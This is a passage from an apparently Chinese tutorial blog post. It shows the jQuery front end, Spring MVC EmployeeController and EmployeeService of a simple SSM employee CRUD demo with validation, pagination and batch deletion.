class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //3.判断之前的ajax用户名校验是否成功</span></span><br><span class="line"><span class="xml">        if($(this).attr("ajax-va")=="error")&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //4.发送ajax请求保存员工</span></span><br><span class="line"><span class="xml">        // alert($("#empAddModal form").serialize());</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp",</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            data:$("#empAddModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    //员工保存成功：</span></span><br><span class="line"><span class="xml">                    //1. 关闭模态框</span></span><br><span class="line"><span class="xml">                    $("#empAddModal").modal('hide');</span></span><br><span class="line"><span class="xml">                    //2. 来到最后一页，显示刚才保存的数据</span></span><br><span class="line"><span class="xml">                    //发送ajax请求显示最后一页数据即可</span></span><br><span class="line"><span class="xml">                    //可以将总记录数当作页码</span></span><br><span class="line"><span class="xml">                    to_page(totalRecords);</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    //显示失败信息</span></span><br><span class="line"><span class="xml">                    // console.log(result);</span></span><br><span class="line"><span class="xml">                    //有哪个字段的错误信息，就显示哪个字段</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.email)&#123;</span></span><br><span class="line"><span class="xml">                        //显示邮箱错误信息</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#email_add_input","error",result.extend.errorFields.email);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.empName)&#123;</span></span><br><span class="line"><span class="xml">                        //显示员工错误信息</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#empName_add_input","error",result.extend.result.extend.errorFields.empName);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.按钮创建之前就绑定了click，所以绑定不上</span></span><br><span class="line"><span class="xml">    //1).可以在创建按钮的时候绑定事件 2).live()</span></span><br><span class="line"><span class="xml">    //jquery新版没有live，使用on方法进行替代</span></span><br><span class="line"><span class="xml">    $(document).on("click",".edit_btn",function () &#123;</span></span><br><span class="line"><span class="xml">      //alert("edit")</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //1.查出部门信息，并显示部门列表</span></span><br><span class="line"><span class="xml">        getDepts("#empUpdateModal select");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2.查出员工信息，显示员工信息</span></span><br><span class="line"><span class="xml">        getEmp($(this).attr("edit-id"));</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //3.把员工的id传递给模态框的更新按钮</span></span><br><span class="line"><span class="xml">        $("#emp_update_btn").attr("edit-id",$(this).attr("edit-id"));</span></span><br><span class="line"><span class="xml">        $("#empUpdateModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function getEmp(id) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp/"+id,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                var empData = result.extend.emp;</span></span><br><span class="line"><span class="xml">                $("#empName_update_static").text(empData.empName);</span></span><br><span class="line"><span class="xml">                $("#email_update_input").val(empData.email);</span></span><br><span class="line"><span class="xml">                $("#empUpdateModal input[name=gender]").val([empData.gender]);</span></span><br><span class="line"><span class="xml">                $("#empUpdateModal select").val([empData.dId]);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击更新，更新员工信息</span></span><br><span class="line"><span class="xml">    $("#emp_update_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.验证邮箱是否合法</span></span><br><span class="line"><span class="xml">        var email = $("#email_update_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_update_input","error","邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_update_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        //2.发送ajax请求，保存更新的员工数据</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp/"+$(this).attr("edit-id"),</span></span><br><span class="line"><span class="xml">            type:"PUT",</span></span><br><span class="line"><span class="xml">            data:$("#empUpdateModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                //1.关闭模态框</span></span><br><span class="line"><span class="xml">                $("#empUpdateModal").modal("hide");</span></span><br><span class="line"><span class="xml">                //2.回到本页面</span></span><br><span class="line"><span class="xml">                to_page(currentPage);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //单个删除</span></span><br><span class="line"><span class="xml">    $(document).on("click",".delete_btn",function () &#123;</span></span><br><span class="line"><span class="xml">        //1.弹出确认删除对话框</span></span><br><span class="line"><span class="xml">        var empName = $(this).parents("tr").find("td:eq(2)").text();</span></span><br><span class="line"><span class="xml">        var empId = $(this).attr("del-id");</span></span><br><span class="line"><span class="xml">        //alert($(this).parents("tr").find("td:eq(1)").text());</span></span><br><span class="line"><span class="xml">        if(confirm("确认删除["+empName+"]吗？"))&#123;</span></span><br><span class="line"><span class="xml">            //确认，发送ajax请求删除即可</span></span><br><span class="line"><span class="xml">            $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emp/"+empId,</span></span><br><span class="line"><span class="xml">                type:"DELETE",</span></span><br><span class="line"><span class="xml">                success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                    alert(result.msg);</span></span><br><span class="line"><span class="xml">                    //回到本页</span></span><br><span class="line"><span class="xml">                    to_page(currentPage);</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //完成全选/全不选</span></span><br><span class="line"><span class="xml">    $("#check_all").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //attr获取checked是undefined</span></span><br><span class="line"><span class="xml">        //我们这些dom原生的属性,attr获取自定义属性的值</span></span><br><span class="line"><span class="xml">        //prop修改和读取dom原生属性的值</span></span><br><span class="line"><span class="xml">       $(".check_item").prop("checked",$(this).prop("checked"));</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //判断当前选择中的元素是否5个</span></span><br><span class="line"><span class="xml">    $(document).on("click",".check_item",function () &#123;</span></span><br><span class="line"><span class="xml">        var flag = $(".check_item:checked").length == $(".check_item").length;</span></span><br><span class="line"><span class="xml">        $("#check_all").prop("checked",flag);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击全部删除，就批量删除</span></span><br><span class="line"><span class="xml">    $("#emp_delete_all_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //$(".check_item:checked")</span></span><br><span class="line"><span class="xml">        var empNames = "";</span></span><br><span class="line"><span class="xml">        var del_idstr = "";</span></span><br><span class="line"><span class="xml">        $.each($(".check_item:checked"),function () &#123;</span></span><br><span class="line"><span class="xml">           //this</span></span><br><span class="line"><span class="xml">            empNames += $(this).parents("tr").find("td:eq(2)").text()+"，";</span></span><br><span class="line"><span class="xml">            //组装员工id字符串</span></span><br><span class="line"><span class="xml">            del_idstr += $(this).parents("tr").find("td:eq(1)").text()+"-"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //去除empNames多余的,</span></span><br><span class="line"><span class="xml">        empNames = empNames.substring(0,empNames.length-1);</span></span><br><span class="line"><span class="xml">        //去除删除的id多余的-</span></span><br><span class="line"><span class="xml">        del_idstr = del_idstr.substring(0,del_idstr.length-1);</span></span><br><span class="line"><span class="xml">        if(confirm("确认删除["+empNames+"]吗？"))&#123;</span></span><br><span class="line"><span class="xml">            //发送ajax请求</span></span><br><span class="line"><span class="xml">            $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emp/"+del_idstr,</span></span><br><span class="line"><span class="xml">               type:"DELETE",</span></span><br><span class="line"><span class="xml">               success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                   alert(result.msg);</span></span><br><span class="line"><span class="xml">                   //回到当前页面</span></span><br><span class="line"><span class="xml">                   to_page(currentPage);</span></span><br><span class="line"><span class="xml">               &#125;</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>最后的EmployeeController<br><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">package com.ceit.crud.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Msg;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.service.EmployeeService;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageHelper;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.<span class="keyword">factory</span>.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.BindingResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.FieldError;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">List</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>处理员工CRUD请求</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> *</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> */</span></span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EmployeeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    EmployeeService employeeService;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>单个批量二合一</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>批量删除：1-2-3</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>单个删除：1</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param ids</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/emp/&#123;ids&#125;"</span>,method = RequestMethod.DELETE)</span><br><span class="line">    public Msg deleteEmp(<span class="meta">@PathVariable</span>(<span class="string">"ids"</span>)<span class="built_in">String</span> ids)&#123;</span><br><span class="line">        <span class="comment">//批量删除</span></span><br><span class="line">        <span class="keyword">if</span>(ids.contains(<span class="string">"-"</span>))&#123;</span><br><span class="line">            <span class="built_in">List</span>&lt;Integer&gt; del_ids = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="built_in">String</span>[] str_ids = ids.split(<span class="string">"-"</span>);</span><br><span class="line">            <span class="comment">//组装id的集合</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">String</span> string : str_ids)&#123;</span><br><span class="line">                del_ids.add(Integer.parseInt(string));</span><br><span class="line">            &#125;</span><br><span class="line">            employeeService.deleteBatch(del_ids);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Integer id = Integer.parseInt(ids);</span><br><span class="line">            employeeService.deleteEmp(id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Msg.success();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>如果直接发送ajax=PUT形式的请求</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>封装的数据</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Employee</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>问题：</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>请求体中有数据</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>但是Employee对象封装不上</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>原因：</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>tomcat:</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *   </span>1. 将请求体中的数据，封装一个map</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *   </span>2. request.getParameter("empName")就会从这个map中取值</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *   </span>3. SpringMVC封装POJO对象的时候，会把POJO种每个属性的值，request.getParamter("email");</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>AJAX不能直接发PUT请求</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Tomcat检测到PUT请求就不会封装请求体数据为map，只有POST请求才会封装请求体</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>org.apache.catalina.connector.Request;</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>parseParameters() （3111）</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>我们要能支持直接发送PUT之类的请求还要封装请求体中的数据</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>配置上HttpPutFormContentFilter</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>它的作用，将请求体中的数据解析包装成一个map，request被重新包装,request.getParameter()被重写，就会从自己封装的map中取数据</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>员工更新方法</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param employee</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/emp/&#123;empId&#125;"</span>,method = RequestMethod.PUT)</span><br><span class="line">    public Msg saveEmp(Employee employee)&#123;</span><br><span class="line">        employeeService.updateEmp(employee);</span><br><span class="line">        <span class="keyword">return</span> Msg.success();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>按照员工id查询员工</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param id</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value=<span class="string">"/emp/&#123;id&#125;"</span>,method=RequestMethod.GET)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    public Msg getEmp(<span class="meta">@PathVariable</span>(<span class="string">"id"</span>) Integer id)&#123;</span><br><span class="line">        Employee employee = employeeService.getEmp(id);</span><br><span class="line">        <span class="keyword">return</span> Msg.success().add(<span class="string">"emp"</span>,employee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查用户名是否可用</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/checkUser"</span>)</span><br><span class="line">    public Msg checkUser(<span class="meta">@RequestParam</span>(<span class="string">"empName"</span>) <span class="built_in">String</span> empName)&#123;</span><br><span class="line">        <span class="comment">//先判断用户名是否是合法的表达式;</span></span><br><span class="line">        <span class="built_in">String</span> regx = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span>;</span><br><span class="line">        <span class="keyword">if</span>(!empName.matches(regx))&#123;</span><br><span class="line">            <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"用户名必须是6到16位数字和字母的组合或2-5位中文"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据库用户名重复校验</span></span><br><span class="line">        boolean b = employeeService.checkUser(empName);</span><br><span class="line">        <span class="keyword">if</span>(b)&#123;</span><br><span class="line">            <span class="keyword">return</span> Msg.success();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"用户名不可用"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>员工保存</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>1.支持JSR303校验</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>2. 导入Hibernate-validator</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param employee</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/emp"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    public Msg saveEmp(<span class="meta">@Valid</span>  Employee employee, BindingResult result)&#123;</span><br><span class="line">        <span class="keyword">if</span>(result.hasErrors())&#123;</span><br><span class="line">            <span class="comment">//校验失败应该返回失败，在模态框中显示校验失败的错误信息</span></span><br><span class="line">            <span class="built_in">Map</span>&lt;<span class="built_in">String</span>,<span class="built_in">Object</span>&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="built_in">List</span>&lt;FieldError&gt; errors = result.getFieldErrors();</span><br><span class="line">            <span class="keyword">for</span>(FieldError fieldError : errors)&#123;</span><br><span class="line">                System.out.println(<span class="string">"错误的字段名："</span>+fieldError.getField());</span><br><span class="line">                System.out.println(<span class="string">"错误信息："</span>+fieldError.getDefaultMessage());</span><br><span class="line">                map.put(fieldError.getField(),fieldError.getDefaultMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Msg.fail().add(<span class="string">"errorFields"</span>,map);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            employeeService.saveEmp(employee);</span><br><span class="line">            <span class="keyword">return</span> Msg.success();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>导入jackson包</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param pn</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/emps"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    public Msg getEmpsWithJson(<span class="meta">@RequestParam</span>(value = <span class="string">"pn"</span>,defaultValue = <span class="string">"1"</span>)Integer pn)&#123;</span><br><span class="line">        <span class="comment">//这不是一个分页查询</span></span><br><span class="line">        <span class="comment">//引入PageHelper分页插件</span></span><br><span class="line">        <span class="comment">//在查询之前只需要调用,传入页码以及每页的个数</span></span><br><span class="line">        PageHelper.startPage(pn,<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//startPage后面紧跟的这个查询就是一个分页查询</span></span><br><span class="line">        <span class="built_in">List</span>&lt;Employee&gt; emps = employeeService.getAll();</span><br><span class="line">        <span class="comment">//使用PageInfo包装查询后的结果，只需要将PageInfo交给页面就行了</span></span><br><span class="line">        <span class="comment">//封装了详细的分页信息，包括有我们查询出来的数据,连续显示的页数</span></span><br><span class="line">        PageInfo page= <span class="keyword">new</span> PageInfo(emps,<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">return</span> Msg.success().add(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>查询员工数据(分页查询)</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//@RequestMapping("/emps")</span></span><br><span class="line">    public <span class="built_in">String</span> getEmps(<span class="meta">@RequestParam</span>(value = <span class="string">"pn"</span>,defaultValue = <span class="string">"1"</span>)Integer pn, Model model)&#123;</span><br><span class="line">        <span class="comment">//这不是一个分页查询</span></span><br><span class="line">        <span class="comment">//引入PageHelper分页插件</span></span><br><span class="line">        <span class="comment">//在查询之前只需要调用,传入页码以及每页的个数</span></span><br><span class="line">        PageHelper.startPage(pn,<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//startPage后面紧跟的这个查询就是一个分页查询</span></span><br><span class="line">        <span class="built_in">List</span>&lt;Employee&gt; emps = employeeService.getAll();</span><br><span class="line">        <span class="comment">//使用PageInfo包装查询后的结果，只需要将PageInfo交给页面就行了</span></span><br><span class="line">        <span class="comment">//封装了详细的分页信息，包括有我们查询出来的数据,连续显示的页数</span></span><br><span class="line">        PageInfo page= <span class="keyword">new</span> PageInfo(emps,<span class="number">5</span>);</span><br><span class="line">        model.addAttribute(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">        page.getNavigatepageNums();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"list"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后的EmployeeService<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.EmployeeExample;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.dao.EmployeeMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    EmployeeMapper employeeMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有员工</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Employee&gt; <span class="title">getAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">return</span> employeeMapper.selectByExampleWithDept(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 员工保存方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveEmp</span><span class="params">(Employee employee)</span></span>&#123;</span><br><span class="line">        employeeMapper.insertSelective(employee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检验用户名是否可用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> empName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true 代表当前姓名可用 false 代表不可用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkUser</span><span class="params">(String empName)</span> </span>&#123;</span><br><span class="line">        EmployeeExample example = <span class="keyword">new</span> EmployeeExample();</span><br><span class="line">        EmployeeExample.Criteria criteria = example.createCriteria();</span><br><span class="line">        criteria.andEmpNameEqualTo(empName);</span><br><span class="line">        <span class="keyword">long</span> count = employeeMapper.countByExample(example);</span><br><span class="line">        <span class="keyword">return</span> count==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Employee <span class="title">getEmp</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        Employee employee = employeeMapper.selectByPrimaryKey(id);</span><br><span class="line">        <span class="keyword">return</span> employee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 员工更新</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> employee</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateEmp</span><span class="params">(Employee employee)</span></span>&#123;</span><br><span class="line">        employeeMapper.updateByPrimaryKeySelective(employee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 员工删除</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span 